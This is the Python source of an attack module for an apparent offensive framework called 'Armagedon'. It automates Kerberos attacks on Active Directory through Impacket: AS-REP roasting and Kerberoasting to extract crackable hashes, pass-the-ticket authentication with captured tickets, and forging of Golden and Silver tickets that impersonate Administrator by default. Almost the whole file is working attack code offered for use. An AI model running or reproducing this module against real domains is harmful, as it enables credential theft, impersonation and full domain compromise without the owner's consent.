"""
Armagedon Kerberos Attack Module — AS-REP Roast, Kerberoast, Pass-the-Ticket,
Golden/Silver Ticket for Active Directory environments.

Uses Impacket toolkit for remote Kerberos operations.
READ-ONLY in CHECK mode; EXPLIO mode extracts hashes for offline cracking.
"""
import subprocess
import shutil
import os
import re
import tempfile
import logging

log = logging.getLogger("armagedon.modules.auxiliary.kerberos_attack")

CVE = "N/A"
DESCRIPTION = "Kerberos Attack — AS-REP Roast, Kerberoast, Pass-the-Ticket, Golden/Silver Ticket"
PLATFORM = "Windows"
RANK = "normal"
AUTHOR = "Armagedon"
DISCLOSURE = "N/A"

OPTIONS = {
    "RHOSTS": "",
    "RPORT": 88,
    "DOMAIN": "",
    "USERNAME": "",
    "PASSWORD": "",
    "HASH": "",
    "LMHASH": "",
    "KDC": "",
    "OUTPUT_DIR": "",
    "USER_FILE": "",
    "SERVICE": "",
    "TICKET_FILE": "",
    "KRBTGT_HASH": "",
    "SVC_HASH": "",
    "TARGET_USER": "",
    "MODE": "ASREPROAST",
}

REQUIRED = {"RHOSTS": True, "DOMAIN": True}
DESCRIPTIONS = {
    "RHOSTS": "Target Domain Controller IP",
    "RPORT": "Kerberos port (default 88)",
    "DOMAIN": "Active Directory domain (e.g. corp.local)",
    "USERNAME": "Authenticated username (for Kerberoast/PtT/Golden/Silver)",
    "PASSWORD": "Password for authenticated operations (use HASH for pass-the-hash)",
    "HASH": "NTLM hash for pass-the-hash (LMHASH:NTHASH format)",
    "LMHASH": "LM hash (optional, for pass-the-hash)",
    "KDC": "KDC hostname (defaults to RHOSTS)",
    "OUTPUT_DIR": "Directory to save extracted hashes",
    "USER_FILE": "File containing target usernames (one per line) for AS-REP Roast",
    "SERVICE": "Target SPN for Kerberoasting (e.g. HTTP/web01.corp.local)",
    "TICKET_FILE": "Path to captured .ccache or .kirbi ticket for Pass-the-Ticket",
    "KRBTGT_HASH": "krbtgt NTLM hash for Golden Ticket (LMHASH:NTHASH)",
    "SVC_HASH": "Service account NTLM hash for Silver Ticket (LMHASH:NTHASH)",
    "TARGET_USER": "Target user for Silver Ticket impersonation",
    "MODE": "Attack mode: ASREPROAST | KERBEROAST | PASS_THE_TICKET | GOLDEN_TICKET | SILVER_TICKET | CHECK",
}

TOOLS = {
    "GetNPUsers.py": "impacket-GetNPUsers",
    "GetUserSPNs.py": "impacket-GetUserSPNs",
    "ticketer.py": "impacket-ticketer",
    "psexec.py": "impacket-psexec",
    "smbclient.py": "impacket-smbclient",
    "mimikatz": "mimikatz",
}


def _find_tool(name):
    """Locate an Impacket or system tool, return path or None."""
    tool_path = TOOLS.get(name, name)
    found = shutil.which(tool_path)
    if found:
        return found
    # Impacket scripts often installed with .py suffix
    alt = shutil.which(f"{tool_path}.py")
    return alt


def _build_cred_args(options):
    """Build credential argument list for Impacket scripts."""
    args = []
    domain = options.get("DOMAIN", "")
    username = options.get("USERNAME", "")
    password = options.get("PASSWORD", "")
    ntlm_hash = options.get("HASH", "")
    lm_hash = options.get("LMHASH", "")
    kdc = options.get("KDC", "")
    rhosts = options.get("RHOSTS", "")

    target = kdc or rhosts

    if domain:
        args.extend(["-domain", domain])
    if username:
        args.extend(["-username", username])
    if password:
        args.extend(["-password", password])
    elif ntlm_hash:
        if lm_hash:
            args.extend(["-hashes", f"{lm_hash}:{ntlm_hash}"])
        else:
            args.extend(["-hashes", f":{ntlm_hash}"])
    if target:
        args.extend(["-dc-ip", target])

    return args


def _ensure_output_dir(options):
    """Create output directory, return path."""
    out = options.get("OUTPUT_DIR", "")
    if not out:
        out = os.path.join(tempfile.gettempdir(), "armagedon_kerberos")
    os.makedirs(out, exist_ok=True)
    return out


def _parse_asrep_hashes(output_text):
    """Parse GetNPUsers.py output for krb5asrep hashes."""
    hashes = []
    pattern = re.compile(r"(krb5asrep\$[^@]+@[^\n]+)")
    for line in output_text.splitlines():
        match = pattern.search(line)
        if match:
            hashes.append(match.group(1))
    return hashes


def _parse_tgs_hashes(output_text):
    """Parse GetUserSPNs.py output for krb5tgs hashes."""
    hashes = []
    pattern = re.compile(r"(krb5tgs\$[^:\n]+(?:\$[^\n]+)?)")
    for line in output_text.splitlines():
        match = pattern.search(line)
        if match:
            hashes.append(match.group(1))
    return hashes


# ──────────────────────────────────────────────────────────────────────
# AS-REP Roasting
# ──────────────────────────────────────────────────────────────────────
def _asrep_roast_check(options):
    """Verify tooling and connectivity for AS-REP Roast."""
    tool = _find_tool("GetNPUsers.py")
    if not tool:
        return False, "impacket-GetNPUsers not found. Install impacket (pip install impacket)."

    if not options.get("RHOSTS"):
        return False, "RHOSTS (Domain Controller IP) required."
    if not options.get("DOMAIN"):
        return False, "DOMAIN required."

    return True, f"Tool: {tool}"


def _asrep_roast_run(options, mode="EXPLOIT"):
    """Run AS-REP Roasting via GetNPUsers.py."""
    ok, msg = _asrep_roast_check(options)
    if not ok:
        return {"success": False, "error": msg}

    tool = _find_tool("GetNPUsers.py")
    output_dir = _ensure_output_dir(options)
    domain = options.get("DOMAIN", "")
    rhosts = options.get("RHOSTS", "")

    user_file = options.get("USER_FILE", "")
    output_file = os.path.join(output_dir, "asrep_hashes.txt")

    cmd = [tool]
    cmd.extend(_build_cred_args(options))

    if user_file and os.path.isfile(user_file):
        cmd.extend(["-usersfile", user_file])
    else:
        # Use a request for all accounts (no user file = try common accounts)
        cmd.append("-request")

    cmd.extend(["-format", "hashcat", "-outputfile", output_file])
    cmd.append("-debug" if mode == "DEBUG" else "")

    print(f"[*] AS-REP Roasting against {rhosts} ({domain})")
    print(f"[*] Command: {' '.join(cmd)}")

    try:
        result = subprocess.run(
            [c for c in cmd if c],
            capture_output=True, text=True, timeout=120
        )
        stdout = result.stdout or ""
        stderr = result.stderr or ""
        combined = stdout + "\n" + stderr

        hashes = _parse_asrep_hashes(combined)

        if hashes:
            print(f"[+] Found {len(hashes)} AS-REP roastable hash(es)")
            for h in hashes:
                print(f"    {h[:80]}...")
        else:
            if "KDC_ERR_PREAUTH_REQUIRED" in combined:
                print("[-] All accounts require pre-authentication (no AS-REP roastable accounts)")
            elif "KDC_ERR_C_PRINCIPAL_UNKNOWN" in combined:
                print("[-] User not found — check domain/username")
            else:
                print("[-] No AS-REP hashes found")

        return {
            "success": bool(hashes),
            "hashes": hashes,
            "hash_count": len(hashes),
            "output_file": output_file if hashes else None,
            "stdout": stdout,
            "stderr": stderr,
        }

    except subprocess.TimeoutExpired:
        return {"success": False, "error": "AS-REP Roast timed out after 120s"}
    except FileNotFoundError:
        return {"success": False, "error": f"Tool not found: {tool}"}


# ──────────────────────────────────────────────────────────────────────
# Kerberoasting
# ──────────────────────────────────────────────────────────────────────
def _kerberoast_check(options):
    """Verify tooling and credentials for Kerberoasting."""
    tool = _find_tool("GetUserSPNs.py")
    if not tool:
        return False, "impacket-GetUserSPNs not found. Install impacket (pip install impacket)."

    if not options.get("RHOSTS"):
        return False, "RHOSTS (Domain Controller IP) required."
    if not options.get("DOMAIN"):
        return False, "DOMAIN required."
    if not options.get("USERNAME"):
        return False, "USERNAME required for Kerberoasting (authenticated)."
    if not options.get("PASSWORD") and not options.get("HASH"):
        return False, "PASSWORD or HASH required for Kerberoasting."

    return True, f"Tool: {tool}"


def _kerberoast_run(options, mode="EXPLOIT"):
    """Run Kerberoasting via GetUserSPNs.py."""
    ok, msg = _kerberoast_check(options)
    if not ok:
        return {"success": False, "error": msg}

    tool = _find_tool("GetUserSPNs.py")
    output_dir = _ensure_output_dir(options)
    domain = options.get("DOMAIN", "")
    rhosts = options.get("RHOSTS", "")
    service = options.get("SERVICE", "")

    output_file = os.path.join(output_dir, "tgs_hashes.txt")

    cmd = [tool]
    cmd.extend(_build_cred_args(options))

    if service:
        cmd.extend(["-target", service])

    cmd.extend(["-request", "-outputfile", output_file])
    cmd.append("-debug" if mode == "DEBUG" else "")

    print(f"[*] Kerberoasting against {rhosts} ({domain})")
    print(f"[*] Command: {' '.join(cmd)}")

    try:
        result = subprocess.run(
            [c for c in cmd if c],
            capture_output=True, text=True, timeout=300
        )
        stdout = result.stdout or ""
        stderr = result.stderr or ""
        combined = stdout + "\n" + stderr

        hashes = _parse_tgs_hashes(combined)

        # Also parse from output file
        if os.path.isfile(output_file):
            with open(output_file, "r", errors="ignore") as f:
                file_hashes = _parse_tgs_hashes(f.read())
                for h in file_hashes:
                    if h not in hashes:
                        hashes.append(h)

        spns_found = re.findall(r"SPN:\s+(\S+)", combined)

        if hashes:
            print(f"[+] Found {len(hashes)} TGS hash(es) from {len(spns_found)} SPN(s)")
            for i, spn in enumerate(spns_found):
                print(f"    [{i+1}] {spn}")
            for h in hashes:
                print(f"    Hash: {h[:80]}...")
        else:
            if "no entries" in combined.lower() or "0 SPNs" in combined:
                print("[-] No service principal names found (no SPNs to roast)")
            else:
                print("[-] No TGS hashes extracted")

        return {
            "success": bool(hashes),
            "hashes": hashes,
            "hash_count": len(hashes),
            "spns": spns_found,
            "output_file": output_file if hashes else None,
            "stdout": stdout,
            "stderr": stderr,
        }

    except subprocess.TimeoutExpired:
        return {"success": False, "error": "Kerberoast timed out after 300s"}
    except FileNotFoundError:
        return {"success": False, "error": f"Tool not found: {tool}"}


# ──────────────────────────────────────────────────────────────────────
# Pass-the-Ticket
# ──────────────────────────────────────────────────────────────────────
def _ptt_check(options):
    """Verify ticket file for Pass-the-Ticket."""
    ticket = options.get("TICKET_FILE", "")
    if not ticket:
        return False, "TICKET_FILE path required (path to .ccache or .kirbi)."
    if not os.path.isfile(ticket):
        return False, f"Ticket file not found: {ticket}"
    return True, f"Ticket: {ticket}"


def _ptt_run(options, mode="EXPLOIT"):
    """Use a captured ticket for authentication via Impacket."""
    ok, msg = _ptt_check(options)
    if not ok:
        return {"success": False, "error": msg}

    ticket = options.get("TICKET_FILE", "")
    rhosts = options.get("RHOSTS", "")
    domain = options.get("DOMAIN", "")

    print(f"[*] Pass-the-Ticket using {ticket}")
    print(f"[*] Target: {rhosts} ({domain})")

    if mode == "CHECK":
        return {
            "success": True,
            "message": "Ticket file validated. Use EXPLOIT mode to authenticate.",
            "ticket": ticket,
        }

    # Try smbexec with ticket for validation
    smbc = _find_tool("smbclient.py")
    if smbc:
        cmd = [smbc, "-k", "-no-pass", "-target", rhosts, "-dc-ip", rhosts]
        env = os.environ.copy()
        env["KRB5CCNAME"] = ticket
        print(f"[*] Attempting authentication with ticket via smbclient.py")
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30, env=env
            )
            success = result.returncode == 0 and "SMB" in (result.stdout or "")
            return {
                "success": success,
                "message": "Ticket authentication succeeded" if success else "Ticket authentication failed",
                "stdout": result.stdout or "",
                "stderr": result.stderr or "",
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "SMB connection timed out"}
        except FileNotFoundError:
            return {"success": False, "error": "smbclient.py not found"}

    return {
        "success": True,
        "message": "Ticket validated. Install Impacket for full PTT authentication.",
        "ticket": ticket,
    }


# ──────────────────────────────────────────────────────────────────────
# Golden Ticket
# ──────────────────────────────────────────────────────────────────────
def _golden_check(options):
    """Verify krbtgt hash for Golden Ticket."""
    krbtgt_hash = options.get("KRBTGT_HASH", "")
    domain = options.get("DOMAIN", "")
    if not krbtgt_hash:
        return False, "KRBTGT_HASH required (LMHASH:NTHASH of krbtgt account)."
    if not domain:
        return False, "DOMAIN required for Golden Ticket."
    if ":" not in krbtgt_hash:
        return False, "KRBTGT_HASH must be in LMHASH:NTHASH format (use : separator)."
    return True, f"Domain: {domain}, krbtgt hash provided"


def _golden_run(options, mode="EXPLOIT"):
    """Forge a Golden Ticket using krbtgt hash."""
    ok, msg = _golden_check(options)
    if not ok:
        return {"success": False, "error": msg}

    tool = _find_tool("ticketer.py")
    domain = options.get("DOMAIN", "")
    krbtgt_hash = options.get("KRBTGT_HASH", "")
    rhosts = options.get("RHOSTS", "")
    target_user = options.get("TARGET_USER", "Administrator")
    output_dir = _ensure_output_dir(options)

    print(f"[*] Golden Ticket — domain: {domain}, impersonating: {target_user}")
    print(f"[*] krbtgt hash: {krbtgt_hash[:20]}...")

    if mode == "CHECK":
        return {
            "success": True,
            "message": "Golden Ticket parameters validated. Use EXPLOIT to forge.",
            "domain": domain,
            "impersonate": target_user,
        }

    if not tool:
        return {"success": False, "error": "impacket-ticketer not found."}

    output_ccache = os.path.join(output_dir, f"golden_{target_user}.ccache")

    # Impacket ticketer: -nthash krbtgt_NTLM -domain-sid S-1-5-21-... -domain corp.local Administrator
    # We use -nthash since we typically have the NT hash
    parts = krbtgt_hash.split(":")
    nt_hash = parts[-1] if len(parts) >= 2 else parts[0]

    cmd = [
        tool,
        "-nthash", nt_hash,
        "-domain", domain,
        "-domain-sid", "S-1-5-21-0-0-0-0",  # Placeholder; real SID from LDAP preferred
        "-user", target_user,
        "-spn", f"{target_user}/{domain}",
        target_user,
    ]

    print(f"[*] Forging Golden Ticket via ticketer.py")
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=60
        )
        stdout = result.stdout or ""
        stderr = result.stderr or ""

        # Ticketer saves .ccache in CWD
        ccache_files = [f for f in os.listdir(".") if f.endswith(".ccache") and target_user.lower() in f.lower()]
        if ccache_files:
            for cf in ccache_files:
                os.rename(cf, os.path.join(output_dir, cf))
            print(f"[+] Golden Ticket forged: {output_ccache}")
            return {
                "success": True,
                "ticket_file": os.path.join(output_dir, ccache_files[0]),
                "impersonate": target_user,
                "domain": domain,
                "stdout": stdout,
                "stderr": stderr,
            }

        print(f"[-] Golden Ticket creation may have failed")
        return {
            "success": False,
            "error": "No .ccache output produced",
            "stdout": stdout,
            "stderr": stderr,
        }

    except FileNotFoundError:
        return {"success": False, "error": f"Tool not found: {tool}"}
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "ticketer.py timed out"}


# ──────────────────────────────────────────────────────────────────────
# Silver Ticket
# ──────────────────────────────────────────────────────────────────────
def _silver_check(options):
    """Verify service hash for Silver Ticket."""
    svc_hash = options.get("SVC_HASH", "")
    service = options.get("SERVICE", "")
    domain = options.get("DOMAIN", "")
    target_user = options.get("TARGET_USER", "")

    if not svc_hash:
        return False, "SVC_HASH required (service account LMHASH:NTHASH)."
    if not service:
        return False, "SERVICE SPN required (e.g. HTTP/web01.corp.local)."
    if not domain:
        return False, "DOMAIN required for Silver Ticket."
    if not target_user:
        return False, "TARGET_USER required (user to impersonate)."
    if ":" not in svc_hash:
        return False, "SVC_HASH must be in LMHASH:NTHASH format."
    return True, f"SPN: {service}, impersonate: {target_user}"


def _silver_run(options, mode="EXPLOIT"):
    """Forge a Silver Ticket using a service account hash."""
    ok, msg = _silver_check(options)
    if not ok:
        return {"success": False, "error": msg}

    tool = _find_tool("ticketer.py")
    domain = options.get("DOMAIN", "")
    svc_hash = options.get("SVC_HASH", "")
    service = options.get("SERVICE", "")
    target_user = options.get("TARGET_USER", "Administrator")
    output_dir = _ensure_output_dir(options)

    print(f"[*] Silver Ticket — SPN: {service}, impersonating: {target_user}")

    if mode == "CHECK":
        return {
            "success": True,
            "message": "Silver Ticket parameters validated. Use EXPLOIT to forge.",
            "spn": service,
            "domain": domain,
            "impersonate": target_user,
        }

    if not tool:
        return {"success": False, "error": "impacket-ticketer not found."}

    parts = svc_hash.split(":")
    nt_hash = parts[-1] if len(parts) >= 2 else parts[0]

    cmd = [
        tool,
        "-nthash", nt_hash,
        "-domain", domain,
        "-domain-sid", "S-1-5-21-0-0-0-0",
        "-user", target_user,
        "-spn", service,
        target_user,
    ]

    print(f"[*] Forging Silver Ticket via ticketer.py")
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=60
        )
        stdout = result.stdout or ""
        stderr = result.stderr or ""

        ccache_files = [f for f in os.listdir(".") if f.endswith(".ccache") and target_user.lower() in f.lower()]
        if ccache_files:
            for cf in ccache_files:
                os.rename(cf, os.path.join(output_dir, cf))
            print(f"[+] Silver Ticket forged: {os.path.join(output_dir, ccache_files[0])}")
            return {
                "success": True,
                "ticket_file": os.path.join(output_dir, ccache_files[0]),
                "spn": service,
                "impersonate": target_user,
                "domain": domain,
                "stdout": stdout,
                "stderr": stderr,
            }

        print("[-] Silver Ticket creation may have failed")
        return {
            "success": False,
            "error": "No .ccache output produced",
            "stdout": stdout,
            "stderr": stderr,
        }

    except FileNotFoundError:
        return {"success": False, "error": f"Tool not found: {tool}"}
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "ticketer.py timed out"}


# ──────────────────────────────────────────────────────────────────────
# Mode dispatcher
# ──────────────────────────────────────────────────────────────────────
_MODE_DISPATCH = {
    "ASREPROAST":  (_asrep_roast_check,  _asrep_roast_run),
    "KERBEROAST":  (_kerberoast_check,    _kerberoast_run),
    "PASS_THE_TICKET": (_ptt_check,       _ptt_run),
    "GOLDEN_TICKET":   (_golden_check,    _golden_run),
    "SILVER_TICKET":   (_silver_check,    _silver_run),
}


def check(options=None, target=None, **kwargs):
    """Check if the selected Kerberos attack mode can run."""
    opts = dict(options or {})
    if target:
        opts["RHOSTS"] = target

    mode = opts.get("MODE", "ASREPROAST").upper().replace("-", "_").replace(" ", "_")
    check_fn, _ = _MODE_DISPATCH.get(mode, (None, None))
    if check_fn is None:
        return False, f"Unknown mode: {mode}. Valid: {', '.join(_MODE_DISPATCH.keys())}"
    return check_fn(opts)


def run(options=None, target=None, mode="CHECK", **kwargs):
    """Execute the selected Kerberos attack.

    Args:
        options: Dict of module options.
        target: Target IP (overrides RHOSTS).
        mode: "CHECK" to validate only, "EXPLOIT" to extract hashes/forged tickets,
              "DEBUG" for verbose output.
    """
    opts = dict(options or {})
    if target:
        opts["RHOSTS"] = target

    attack_mode = opts.get("MODE", "ASREPROAST").upper().replace("-", "_").replace(" ", "_")
    log.info(f"Kerberos attack mode={attack_mode} target={opts.get('RHOSTS','')}")
    _, run_fn = _MODE_DISPATCH.get(attack_mode, (None, None))

    if run_fn is None:
        return {"success": False, "error": f"Unknown mode: {attack_mode}"}

    print(f"\n{'='*60}")
    print(f"  Armagedon — Kerberos Attack ({attack_mode})")
    print(f"{'='*60}")

    result = run_fn(opts, mode=mode.upper())

    print(f"\n{'='*60}")
    status = "\033[92mSUCCESS\033[0m" if result.get("success") else "\033[91mFAILED\033[0m"
    print(f"  Result: {status}")
    print(f"{'='*60}\n")

    return result
